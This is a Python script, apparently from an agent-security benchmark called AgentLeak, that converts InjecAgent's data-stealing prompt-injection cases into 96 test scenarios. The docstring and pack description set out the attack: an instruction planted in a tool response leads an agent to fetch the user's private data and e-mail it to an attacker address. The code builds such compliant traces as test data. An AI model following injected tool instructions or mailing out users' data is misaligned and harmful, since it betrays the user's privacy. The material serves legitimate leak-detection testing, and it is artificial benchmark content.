#!/usr/bin/env python3
# SPDX-FileCopyrightText: 2026 AgentLeak contributors
# SPDX-License-Identifier: MIT
"""Build ``injecagent_ds.json`` from InjecAgent's data-stealing cases.

InjecAgent (Zhan et al., Findings of ACL 2024; MIT,
https://github.com/uiuc-kang-lab/InjecAgent) plants an attacker instruction
inside the response of a tool the user legitimately asked for. In the
*data-stealing* (DS) half, the instruction tells the agent to call a second
tool that reads the user's private data, then e-mail it to the attacker. The
repository ships the cases and, in ``attacker_simulated_responses.json``,
the private data those tools returned during the authors' runs.

Each scenario here is one case where the agent complies: the user's tool call,
its response carrying the injection, the attacker's data tool and the private
data it returns, and the ``GmailSendEmail`` call that carries that data to the
attacker. The stolen values are the canaries, so the scenario scores
deterministically. Removing the two attacker steps gives the clean counterpart
(the agent ignored the injection); the tests check that it scores no canary.

Selection: every one of the 32 DS attacker cases, each paired with three of the
17 user cases (rotating, so every user tool appears), the third pairing in
InjecAgent's "enhanced" setting (the hacking prompt prefix). 96 scenarios.

Usage
-----
    python scripts/packs/build_injecagent_pack.py PATH/TO/InjecAgent/data

Reads ``test_cases_ds_base.json``, ``test_cases_ds_enhanced.json`` and
``attacker_simulated_responses.json`` from that directory (commit
f19c9f2c79a41046eb13c03c51a24c567a8ffa07 was used). Deterministic: the same
inputs give a byte-identical pack.
"""

from __future__ import annotations

import ast
import json
import re
import sys
import warnings
from pathlib import Path
from typing import Any

OUT = Path(__file__).resolve().parents[2] / "src" / "agentleak" / "scenarios" / "packs" / "injecagent_ds.json"
COMMIT = "f19c9f2c79a41046eb13c03c51a24c567a8ffa07"
ATTACKER_EMAIL = "amy.watson@gmail.com"  # the attacker address used by every InjecAgent DS case
PAIRS_PER_ATTACK = 3
MAX_CANARIES = 8
# Keys whose values describe the record rather than belong to the person.
_PERSONAL_KEY_WORDS = ("name", "medication", "drug", "condition", "diagnos", "password", "user")
_NOT_SECRET_KEYS = {"status", "type", "remark", "gender", "description", "website", "title"}


def _parse(text: str) -> Any:
    warnings.filterwarnings("ignore", category=SyntaxWarning)
    try:
        return json.loads(text)
    except (ValueError, TypeError):
        try:
            return ast.literal_eval(text)
        except (ValueError, SyntaxError):
            return None


def _leaves(value: Any, key: str = "") -> list[tuple[str, str]]:
    if isinstance(value, dict):
        return [leaf for k, v in value.items() for leaf in _leaves(v, str(k))]
    if isinstance(value, list):
        return [leaf for v in value for leaf in _leaves(v, key)]
    if isinstance(value, str):
        return [(key, value)]
    return []


def _canaries(data: Any) -> list[str]:
    out: list[str] = []
    for key, value in _leaves(data):
        text = value.strip()
        if len(text) < 5 or key.lower() in _NOT_SECRET_KEYS or text in out:
            continue
        # A single word with no digit ("limit", "confirmed", "Checking") is a
        # status or a category, not the person's data, unless the field says
        # it is (a medication name, a username, a condition).
        if text.isalpha() and not any(w in key.lower() for w in _PERSONAL_KEY_WORDS):
            continue
        out.append(text)
        if len(out) == MAX_CANARIES:
            break
    return out


def _private_data(responses: dict[str, str], tool: str) -> tuple[dict[str, Any], str, Any] | None:
    """The first simulated response for ``tool``, in file order, whose arguments
    and output parse. File order puts the plain call (``(Tool,{})``) first."""
    for key in (k for k in responses if k.startswith(f"({tool},")):
        args = _parse(key[len(tool) + 2:-1])
        data = _parse(responses[key])
        if isinstance(args, dict) and isinstance(data, (dict, list)) and _canaries(data):
            return args, responses[key].strip(), data
    return None


def _slug(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")


def build(data_dir: Path) -> dict[str, Any]:
    base = json.loads((data_dir / "test_cases_ds_base.json").read_text())
    enhanced = json.loads((data_dir / "test_cases_ds_enhanced.json").read_text())
    responses = json.loads((data_dir / "attacker_simulated_responses.json").read_text())

    attackers = sorted({c["Attacker Tools"][0] for c in base})
    users = sorted({c["User Tool"] for c in base})
    by_pair = {(c["Attacker Tools"][0], c["User Tool"]): c for c in base}
    by_pair_enh = {(c["Attacker Tools"][0], c["User Tool"]): c for c in enhanced}

    scenarios: list[dict[str, Any]] = []
    skipped: list[str] = []
    for i, attacker in enumerate(attackers):
        private = _private_data(responses, attacker)
        if private is None:
            skipped.append(attacker)
            continue
        args, observation, data = private
        for k in range(PAIRS_PER_ATTACK):
            user = users[(i * PAIRS_PER_ATTACK + k) % len(users)]
            setting = "enhanced" if k == PAIRS_PER_ATTACK - 1 else "base"
            case = (by_pair_enh if setting == "enhanced" else by_pair).get((attacker, user))
            if case is None:
                continue
            # A value the run already shows before the attack (in the user's
            # request, the user's tool call or its injected response) is not
            # evidence the private data left: it would score a leak on the
            # clean counterpart too.
            before_attack = " ".join(
                (case["User Instruction"], str(case["Tool Parameters"]), str(case["Tool Response"]))
            )
            canaries = [c for c in _canaries(data) if c not in before_attack]
            if not canaries:
                continue
            tool_response = str(case["Tool Response"]).strip()
            if tool_response.startswith('"') and tool_response.endswith('"'):
                tool_response = tool_response[1:-1]
            user_args = _parse(case["Tool Parameters"])
            body = json.dumps(data, ensure_ascii=False, separators=(", ", ": "))
            scenarios.append({
                "id": f"injecagent_ds__{_slug(user)}__{_slug(attacker)}__{setting}",
                "benchmark": "injecagent",
                "suite": _slug(case["Attack Type"]),
                "setting": setting,
                "user_task": user,
                "injection_task": attacker,
                "user_prompt": case["User Instruction"],
                "attack_goal": case["Attacker Instruction"],
                "expected_achievements": case["Expected Achievements"],
                "steps": [{
                    "tool": user,
                    "args": user_args if isinstance(user_args, dict) else {},
                    "observation": tool_response,
                    "error": "",
                    "injected": True,
                }],
                "exfiltration": [
                    {"tool": attacker, "args": args, "observation": observation},
                    {
                        "tool": "GmailSendEmail",
                        "args": {"to": ATTACKER_EMAIL, "subject": "Requested information", "body": body},
                        "observation": '{"success": true}',
                        "leaked": canaries,
                    },
                ],
                "leaked_values": canaries,
            })

    return {
        "id": "injecagent_ds",
        "name": "InjecAgent (data stealing through tool responses)",
        "description": (
            "An instruction planted in a tool response tells the agent to read the user's "
            "private data with a second tool and e-mail it to the attacker: 32 attacker "
            "goals (addresses, payment methods, prescriptions, genetic data, saved "
            "passwords, location, browsing history...) across 17 user tools. The private "
            "data enters on a tool_response and leaves on a tool_call; the stolen values "
            "ship as canaries so each scenario scores deterministically."
        ),
        "source": "uiuc-kang-lab/InjecAgent (Findings of ACL 2024, MIT)",
        "source_url": "https://github.com/uiuc-kang-lab/InjecAgent",
        "license": "MIT",
        "attribution": (
            "Derived from InjecAgent by Zhan, Liang, Ying and Kang (Findings of ACL 2024), "
            f"MIT-licensed, commit {COMMIT}. User and attacker cases, injected tool "
            "responses and the simulated private data are the authors' data; 96 of the 544 "
            "data-stealing cases were selected and reshaped into AgentLeak traces with an "
            "added GmailSendEmail exfiltration step."
        ),
        "format": "injecagent",
        "upstream_commit": COMMIT,
        "skipped_attacker_tools": skipped,
        "scenarios": scenarios,
    }


def main() -> int:
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    pack = build(Path(sys.argv[1]))
    OUT.write_text(json.dumps(pack, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
    print(f"wrote {OUT} ({len(pack['scenarios'])} scenarios, skipped {pack['skipped_attacker_tools']})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
